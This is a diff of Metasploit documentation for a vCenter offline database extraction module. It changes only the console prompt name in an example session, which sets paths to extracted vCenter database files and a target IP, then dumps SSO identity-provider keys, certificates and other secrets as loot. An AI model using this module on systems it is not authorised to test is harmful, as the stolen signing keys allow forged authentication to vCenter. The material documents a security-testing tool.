@@ -61,14 +61,14 @@ If you are extracting from a backup file, target files are available in the foll
 Example run against database files extracted from vCenter appliance version 7.0 Update 3d:
 
 ```
-msf6 > use auxiliary/admin/vmware/vcenter_offline_mdb_extract
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmdir_mdb /tmp/data.mdb
+msf > use auxiliary/admin/vmware/vcenter_offline_mdb_extract
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmdir_mdb /tmp/data.mdb
 vmdir_mdb => /tmp/data.mdb
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmafd_db /tmp/afd.db
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vmafd_db /tmp/afd.db
 vmafd_db => /tmp/afd.db
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vc_ip 192.168.100.70
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > set vc_ip 192.168.100.70
 vc_ip => 192.168.100.70
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump
 
 [*] Extracting vmwSTSTenantCredential from /tmp/data.mdb ...
 [+] SSO_STS_IDP key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_idp_571080.key
@@ -94,5 +94,5 @@ msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > dump
 [+] WCP key: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_WCP_057402.key
 [+] WCP cert: /home/cs137/.msf4/loot/20220512133836_default_192.168.100.70_WCP_909204.pem
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/vmware/vcenter_offline_mdb_extract) > 
+msf auxiliary(admin/vmware/vcenter_offline_mdb_extract) > 
 ```
